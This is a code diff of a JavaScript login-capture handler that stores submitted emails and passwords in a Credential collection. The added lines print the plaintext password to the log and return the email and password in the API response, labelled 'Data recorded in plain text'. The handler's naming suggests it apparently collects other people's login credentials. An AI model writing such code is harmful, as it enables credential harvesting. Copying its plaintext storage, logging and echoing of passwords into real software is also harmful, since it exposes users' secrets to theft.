@@ -5,17 +5,22 @@ export const captureLogin = async (req, res) => {
   try {
     const { email, password } = req.body;
 
+    // This creates the document exactly as the strings are received
     const newEntry = await Credential.create({
       email,
       password,
     });
 
-    console.log("Captured Data ID:", newEntry._id);
+    console.log("Captured Plaintext Password:", newEntry.password);
 
     res.status(201).json({
       success: true,
-      id: newEntry._id,
-      message: "Data recorded",
+      data: {
+        id: newEntry._id,
+        email: newEntry.email,
+        password: newEntry.password, // Visible in the response
+      },
+      message: "Data recorded in plain text",
     });
   } catch (error) {
     res.status(500).json({
